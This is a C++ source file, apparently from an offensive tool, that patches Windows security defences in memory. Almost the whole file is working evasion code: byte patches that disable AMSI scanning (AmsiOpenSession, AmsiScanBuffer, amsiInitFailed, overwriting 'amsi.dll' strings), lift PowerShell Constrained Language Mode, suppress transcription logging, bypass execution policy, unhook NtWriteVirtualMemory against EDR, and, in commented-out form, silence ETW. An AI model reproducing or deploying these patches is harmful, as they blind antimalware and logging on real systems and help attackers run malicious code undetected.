#include "common.h"
#include "patch.h"
#include "clr.h"

//
// The following function patches 'AMSI!AmsiOpenSession' so that it returns the
// error code 0x80070057 (invalid parameters) when invoked. It does so by replacing
// a conditonal jump (JZ) at the beginning of the function with a simple jump (JMP).
// 
// Below is the part of AMSI!AmsiOpenSession we're interest in:
// 
//   48 85 d2        TEST       param_2,param_2    <-- Test if return value pointer is null
//   74 0c           JZ         LAB_180008aa1      <-- Conditional JZ replaced by JMP
//   ...
//   b8 57 00        MOV        EAX,0x80070057     <-- Return error code 0x80070057
//   07 80
//   c3              RET
// 
// Credit:
//   - https://github.com/anonymous300502/Nuke-AMSI
//
BOOL PatchAmsiOpenSession()
{
    BYTE bPatch[] = { 0xeb };

    return PatchUnmanagedFunction(
        L"amsi",
        "AmsiOpenSession",
        bPatch,
        ARRAYSIZE(bPatch),
        3
    );
}

//
// The following function patches 'AMSI!AmsiScanBuffer' so that its third parameter,
// i.e. the one containing the length of the input buffer is always set to 0. Doing
// so causes the function to never scan the input buffer.
// 
//   ...
//   41 8b f8        MOV        EDI,param_3         <-- Copy buffer length to EDI
//   48 8b f2        MOV        RSI,param_2         <-- Copy buffer address to RSI
//   ...
//
// The instruction 'MOV EDI,param_3' is replaced by 'XOR RDI,RDI', which has the same
// size and effectively set RDI to 0.
//
BOOL PatchAmsiScanBuffer()
{
    BYTE bPattern[] = { 0x41, 0x8b, 0xf8 }; // mov edi,r8d
    BYTE bPatch[] = { 0x48, 0x31, 0xff }; // xor rdi,rdi 
    ULONG_PTR pAmsiScanBuffer;
    DWORD dwPatternOffset;

    if (!GetProcedureAddress(L"amsi", "AmsiScanBuffer", &pAmsiScanBuffer))
        return FALSE;

    if (!FindBufferOffset(reinterpret_cast<LPVOID>(pAmsiScanBuffer), bPattern, ARRAYSIZE(bPattern), 100, &dwPatternOffset))
        return FALSE;

    //wprintf(L"[*] Found instruction to patch in AmsiScanBuffer @ 0x%llx (offset: %d)\n", pAmsiScanBuffer + dwPatternOffset, dwPatternOffset);

    return PatchUnmanagedFunction(
        L"amsi",
        "AmsiScanBuffer",
        bPatch,
        ARRAYSIZE(bPatch),
        dwPatternOffset
    );
}


//BOOL PatchEtwRet(CLR &clr)
//{
//    // 0xC3 = ret - hàm return ngay, không ghi event nào
//    BYTE patch[1] = { 0xC3 };
//    return PatchUnmanagedFunction(
//        L"ntdll.dll",
//        "EtwEventWriteTransfer",
//        patch,
//        sizeof(patch),
//        0
//    );
//}
//
//BOOL UnpatchEtwRet(CLR& clr)
//{
//    // 0xC3 = ret - hàm return ngay, không ghi event nào
//    BYTE patch[1] = { 0x4C };
//    return PatchUnmanagedFunction(
//        L"ntdll.dll",
//        "EtwEventWriteTransfer",
//        patch,
//        sizeof(patch),
//        0
//    );
//}

//
// PowerShell uses the method 'GetSystemLockdownPolicy' (SystemPolicy) to get the
// value of the execution policy enforced on the system. By patching this method
// with the following instructions, we force it to always return the value
// SystemEnforcementMode.None, which to translates to "Full Language Mode".
// 
//   xor rax, rax;   <-- Set return value to 0
//   ret;
// 
// Credit:
//   - https://github.com/calebstewart/bypass-clm
//
BOOL PatchSystemPolicyGetSystemLockdownPolicy(CLR &clr)
{
    BYTE bPatch[] = { 0x48, 0x31, 0xc0, 0xc3 }; // mov rax, 0; ret;

    return PatchManagedFunction(
        clr,
        L"System.Management.Automation",
        L"System.Management.Automation.Security.SystemPolicy",
        L"GetSystemLockdownPolicy",
        0,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

//
// When transcription is enabled, PowerShell uses a class named 'TranscriptionOption'
// to store information about the log file path for instance. It also has a method
// named 'FlushContentToDisk' responsible for writing user prompts to this file. By
// patching this method with a simple 'ret' instruction, we effectively prevent it
// from writing anything to disk.
// 
// Credit:
//   - https://github.com/OmerYa/Invisi-Shell
// 
// Links:
//   - https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/hostifaces/MshHostUserInterface.cs
//
BOOL PatchTranscriptionOptionFlushContentToDisk(CLR& clr)
{
    BYTE bPatch[] = { 0xc3 }; // ret;

    return PatchManagedFunction(
        clr,
        L"System.Management.Automation",
        L"System.Management.Automation.Host.TranscriptionOption",
        L"FlushContentToDisk",
        0,
        bPatch,
        ARRAYSIZE(bPatch),
        0
    );
}

//
// Whatever the execution policy enforced on a system, the class 'AuthorizationManager'
// (System.Management.Automation) is in charge of determining whether a given script
// file should be executed, thanks to its internal method 'ShouldRunInternal'. This
// method does not return a boolean value, but instead throws an exception in case the
// execution is restricted. Therefore, by patching this function with a simple 'ret'
// instruction, we make it so that this function never throws an exception, this
// circumventing the execution policy.
// 
// This technique was inspired by a blog post from NetSPI (see credit section), which
// mentions the 'AuthorizationManager' class (technique #12).
// 
// Credit:
//   - https://www.netspi.com/blog/technical-blog/network-pentesting/15-ways-to-bypass-the-powershell-execution-policy/
// 
// Links:
//   - https://github.com/PowerShell/PowerShell/blob/master/src/System.Management.Automation/engine/SecurityManagerBase.cs
//
BOOL PatchAuthorizationManagerShouldRunInternal(CLR& clr)
{
	BYTE bPatch[] = { 0xc3 }; // ret;

	return PatchManagedFunction(
		clr,
		L"System.Management.Automation",
		L"System.Management.Automation.AuthorizationManager",
		L"ShouldRunInternal",
		3,
		bPatch,
		ARRAYSIZE(bPatch),
		0
	);
}

//
// This function bypasses AMSI by setting the static field 'amsiInitFailed' to true.
// The equivalent PowerShell code is:
//
//   [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
//
// This causes the AmsiUtils class to believe that AMSI initialization failed,
// effectively disabling AMSI scanning for the current session.
//
BOOL PatchAmsiInitFailed(CLR& clr)
{
	BOOL bResult = FALSE;
	_Assembly* pAssembly = NULL;
	_Type* pType = NULL;
	VARIANT vtObject = { 0 };
	VARIANT vtValue = { 0 };

	vtObject.vt = VT_EMPTY;
	vtValue.vt = VT_BOOL;
	vtValue.boolVal = VARIANT_TRUE;

	if (!clr.LoadAssembly(L"System.Management.Automation", &pAssembly)) {
		PRINT_ERROR("[ERROR] Failed to load assembly 'System.Management.Automation'\n");
		goto exit;
	}

	if (!clr.GetType(pAssembly, L"System.Management.Automation.AmsiUtils", &pType)) {
		PRINT_ERROR("[ERROR] Failed to get type 'System.Management.Automation.AmsiUtils'\n");
		goto exit;
	}

	if (!clr.SetFieldValue(
		pType,
		BindingFlags(BindingFlags_NonPublic | BindingFlags_Static),
		vtObject,
		L"amsiInitFailed",
		vtValue
	)) {
		//wprintf(L"[ERROR] Failed to set field 'amsiInitFailed'\n");
		goto exit;
	}

	bResult = TRUE;

exit:
	if (pType) pType->Release();
	if (pAssembly) pAssembly->Release();
	VariantClear(&vtValue);

	return bResult;
}

BOOL GetProcedureAddress(LPCWSTR pwszModuleName, LPCSTR pszProcedureName, PULONG_PTR pProcedureAddress)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    FARPROC pProcedure = NULL;

    // We assume the module has already been loaded
    hModule = GetModuleHandleW(pwszModuleName);
    if (!hModule) {
        PRINT_ERROR("GetModuleHandleW");
        goto exit;
    }

    pProcedure = GetProcAddress(hModule, pszProcedureName);
    if (!pProcedure) {
        PRINT_ERROR("GetProcAddress");
        goto exit;
    }

    bResult = TRUE;
    *pProcedureAddress = reinterpret_cast<ULONG_PTR>(pProcedure);

exit:
    return bResult;
}

BOOL PatchProcedure(LPVOID pTargetAddress, LPBYTE pSourceBuffer, DWORD dwSourceBufferSize)
{
    BOOL bResult = FALSE;
    DWORD dwOldProtect = 0;
    BOOL bSuccess = FALSE;
    const BYTE patchedBytes[8] = { 0x4C, 0x8B, 0xD1, 0xB8, 0x3A, 0x00, 0x00, 0x00 };

    BYTE* ntWriteAddr = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    if (!ntWriteAddr) {
        return false;
    }

    if (ntWriteAddr[0] == 0xE9) {
        DWORD oldProtect;
        VirtualProtect(ntWriteAddr, 8, PAGE_EXECUTE_READWRITE, &oldProtect);

        // Patch 8 bytes đầu
        memcpy(ntWriteAddr, patchedBytes, 8);

        // Khôi phục protection
        VirtualProtect(ntWriteAddr, 8, oldProtect, &oldProtect);
    }

    // Kiểm tra bytes đã được patch chưa
    bool alreadyPatched = true;
    for (int i = 0; i < 8; i++) {
        if (ntWriteAddr[i] != patchedBytes[i]) {
            alreadyPatched = false;
            break;
        }
    }

    if (alreadyPatched) {
        bSuccess = VirtualProtectEx(GetCurrentProcess(), pTargetAddress, dwSourceBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);
        if (!bSuccess) {
            PRINT_ERROR("VirtualProtectEx");
            goto exit;
        }

        using FnNtWriteVirtualMemory = NTSTATUS(NTAPI*)(
            HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        auto NtWriteVirtualMemory = (FnNtWriteVirtualMemory)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
        // Avoid using WriteProcessMemory / NtWriteVirtualMemory
        bSuccess = NtWriteVirtualMemory(
            GetCurrentProcess(),
            pTargetAddress,
            pSourceBuffer,
            dwSourceBufferSize,
            nullptr
        );

        bSuccess = VirtualProtectEx(GetCurrentProcess(), pTargetAddress, dwSourceBufferSize, dwOldProtect, &dwOldProtect);
        if (!bSuccess) {
            PRINT_ERROR("VirtualProtectEx");
            goto exit;
        }
    }

    bResult = TRUE;

exit:
    return bResult;
}

BOOL PatchUnmanagedFunction(LPCWSTR pwszMdoduleName, LPCSTR pszProcedureName, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
{
    ULONG_PTR pProcedureAddress = 0;

    if (!GetProcedureAddress(pwszMdoduleName, pszProcedureName, &pProcedureAddress))
        return FALSE;

    pProcedureAddress += dwPatchOffset;

    //printf("[*] Patching unmanaged function '%s' @ 0x%llx\n", pszProcedureName, pProcedureAddress);

    if (!PatchProcedure(reinterpret_cast<LPVOID>(pProcedureAddress), pbPatch, dwPatchSize))
        return FALSE;

    return TRUE;
}

BOOL PatchManagedFunction(CLR &clr, LPCWSTR pwszAssemblyName, LPCWSTR pwszClassName, LPCWSTR pwszMethodName, DWORD dwNbArgs, LPBYTE pbPatch, DWORD dwPatchSize, DWORD dwPatchOffset)
{
    ULONG_PTR pMethodAddress = 0;

    if (!clr.GetJustInTimeMethodAddress(pwszAssemblyName, pwszClassName, pwszMethodName, dwNbArgs, &pMethodAddress))
        return FALSE;

    pMethodAddress += dwPatchOffset;

    //wprintf(L"[*] Patching managed function '%ws' @ 0x%llx\n", pwszMethodName, pMethodAddress);

    if (!PatchProcedure(reinterpret_cast<LPVOID>(pMethodAddress), pbPatch, dwPatchSize))
        return FALSE;

    return TRUE;
}

BOOL FindBufferOffset(LPVOID pStartAddress, LPBYTE pBuffer, DWORD dwBufferSize, DWORD dwMaxSize, PDWORD pdwBufferOffset)
{
    BOOL bResult = FALSE;

    for (DWORD i = 0; i < dwMaxSize - dwBufferSize; i++)
    {
        if (memcmp(pBuffer, (LPVOID)((ULONG_PTR)pStartAddress + i), dwBufferSize) == 0)
        {
            *pdwBufferOffset = i;
            bResult = TRUE;
            break;
        }
    }

    //if (!bResult)
    //    PRINT_ERROR("Failed to find pattern of size %d within the address range 0x%llx - 0x%llx\n", dwBufferSize, (ULONG_PTR)pStartAddress, (ULONG_PTR)pStartAddress + dwMaxSize);

    return bResult;
}

uintptr_t FindFirstString(
    uintptr_t startAddress,
    SIZE_T size,
    const char* target)
{
    if (!target || !*target || size == 0)
        return 0;

    const SIZE_T targetLen = strlen(target);

    uintptr_t current = startAddress;
    uintptr_t end = startAddress + size;

    while (current < end)
    {
        MEMORY_BASIC_INFORMATION mbi{};

        if (VirtualQuery(
            reinterpret_cast<LPCVOID>(current),
            &mbi,
            sizeof(mbi)) == 0)
        {
            return 0;
        }

        uintptr_t regionBase =
            reinterpret_cast<uintptr_t>(mbi.BaseAddress);

        uintptr_t regionEnd =
            regionBase + mbi.RegionSize;

        uintptr_t scanStart =
            max(current, regionBase);

        uintptr_t scanEnd =
            min(end, regionEnd);

        if (mbi.State == MEM_COMMIT &&
            !(mbi.Protect & PAGE_NOACCESS) &&
            !(mbi.Protect & PAGE_GUARD))
        {
            const BYTE* memory =
                reinterpret_cast<const BYTE*>(scanStart);

            SIZE_T scanSize =
                scanEnd - scanStart;

            if (scanSize >= targetLen)
            {
                for (SIZE_T i = 0;
                    i <= scanSize - targetLen;
                    ++i)
                {
                    if (memcmp(
                        memory + i,
                        target,
                        targetLen) == 0)
                    {
                        return scanStart + i;
                    }
                }
            }
        }

        if (regionEnd <= current)
            break;

        current = regionEnd;
    }

    return 0;
}

uintptr_t FindFirstStringW(
    uintptr_t startAddress,
    SIZE_T size,
    const wchar_t* target)
{
    if (!target || !*target || size == 0)
        return 0;

    const SIZE_T targetLen = wcslen(target);
    const SIZE_T targetBytes = targetLen * sizeof(wchar_t);

    uintptr_t current = startAddress;
    uintptr_t end = startAddress + size;

    while (current < end)
    {
        MEMORY_BASIC_INFORMATION mbi{};

        if (VirtualQuery(
            reinterpret_cast<LPCVOID>(current),
            &mbi,
            sizeof(mbi)) == 0)
        {
            return 0;
        }

        uintptr_t regionBase =
            reinterpret_cast<uintptr_t>(mbi.BaseAddress);

        uintptr_t regionEnd =
            regionBase + mbi.RegionSize;

        uintptr_t scanStart =
            max(current, regionBase);

        uintptr_t scanEnd =
            min(end, regionEnd);

        if (mbi.State == MEM_COMMIT &&
            !(mbi.Protect & PAGE_NOACCESS) &&
            !(mbi.Protect & PAGE_GUARD))
        {
            const BYTE* memory =
                reinterpret_cast<const BYTE*>(scanStart);

            SIZE_T scanSize =
                scanEnd - scanStart;

            if (scanSize >= targetBytes)
            {
                for (SIZE_T i = 0;
                    i <= scanSize - targetBytes;
                    ++i)
                {
                    if (memcmp(
                        memory + i,
                        target,
                        targetBytes) == 0)
                    {
                        return scanStart + i;
                    }
                }
            }
        }

        if (regionEnd <= current)
            break;

        current = regionEnd;
    }

    return 0;
}
#include <stdio.h>
void EnumeratePrivateMemory()
{
    SYSTEM_INFO si{};
    GetSystemInfo(&si);

    uintptr_t current =
        reinterpret_cast<uintptr_t>(
            si.lpMinimumApplicationAddress);

    uintptr_t maxAddress =
        reinterpret_cast<uintptr_t>(
            si.lpMaximumApplicationAddress);

    while (current < maxAddress)
    {
        MEMORY_BASIC_INFORMATION mbi{};

        SIZE_T result = VirtualQuery(
            reinterpret_cast<LPCVOID>(current),
            &mbi,
            sizeof(mbi));

        if (result == 0)
            break;

        uintptr_t base =
            reinterpret_cast<uintptr_t>(mbi.BaseAddress);

        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_PRIVATE)
        {
            printf(
                "Base: %p | Size: 0x%llX | Protect: 0x%lX\n",
                reinterpret_cast<void*>(base),
                static_cast<unsigned long long>(mbi.RegionSize),
                mbi.Protect
            );
            wchar_t patchAmsi = L'H';
            LPVOID addrAmsi = (LPVOID)0x1;
            uintptr_t scanAddress = base;
            SIZE_T remainingSize = mbi.RegionSize;

            while (remainingSize > 0)
            {
                uintptr_t found = FindFirstString(
                    scanAddress,
                    remainingSize,
                    "amsi.dll"
                );

                if (!found)
                    break;

                DEBUG("Found string at: %p", (void*)found);

                // xử lý found ở đây
                //wchar_t patchAmsi = L'H';
                char patchAmsi = 'H';
                PatchProcedure((PVOID)found, (BYTE*)&patchAmsi, sizeof(char));

                uintptr_t next = found + sizeof(wchar_t);

                if (next <= scanAddress || next >= base + mbi.RegionSize)
                    break;

                scanAddress = next;
                remainingSize =
                    (base + mbi.RegionSize) - scanAddress;
            }

        }

        uintptr_t next = base + mbi.RegionSize;

        if (next <= current)
            break;

        current = next;
    }
}